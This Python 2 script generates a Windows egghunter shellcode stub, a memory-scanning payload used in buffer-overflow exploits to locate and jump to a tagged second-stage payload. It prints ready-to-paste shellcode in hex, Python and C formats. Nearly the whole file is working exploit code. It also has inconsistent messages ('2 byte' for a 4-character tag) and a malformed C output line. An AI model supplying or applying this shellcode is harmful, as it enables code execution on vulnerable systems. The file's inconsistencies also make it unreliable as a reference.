#!/usr/bin/python
import sys

_RED = '\x1b[1;31m'
_BLU = '\x1b[1;34m'
_GRE = '\x1b[1;32m'
_RST = '\x1b[0;0;0m'

successMessage = lambda x: '{}[+]{} {}'.format(_GRE, _RST, x)
errorMessage = lambda x: '{}[-]{} {}'.format(_RED, _RST, x)
infoMessage = lambda x: '{}[*]{} {}'.format(_BLU, _RST, x)

if len(sys.argv) < 2:
	print errorMessage('You need to give a 2 byte tag!')
	print 'Example: '
	print '\t' + sys.argv[0] + ' Amon'
	print '\t' + sys.argv[0] + ' Fuck'
	sys.exit(-1)
else:
	egg = sys.argv[1]
	print infoMessage('Your tag: ' + egg)

if len(egg) != 4:
	print errorMessage('Your tag need to be a 2 byte word!')
	sys.exit(-1)

pythonformat = ''
hexformat = ''
for x in egg:
	pythonformat += '\\x%02x' % ord(x)
	hexformat += '%02x' % ord(x)

print successMessage('Hexadecimal format: ')
print '''6681caff0f42526a0258cd2e3c055a74efb8{}8bfaaf75eaaf75e7ffe7
'''.format(hexformat)

print successMessage('Python format: ')
print '''egghunter = ''
egghunter += '\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58'
egghunter += '\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8'
egghunter += '{}'
egghunter += '\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7'
'''.format(pythonformat)

print successMessage('C format: ')
print '''unsigned char shellcode[] = \\''
"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58"
"\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8"
"{}"
"\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7";
'''.format(pythonformat)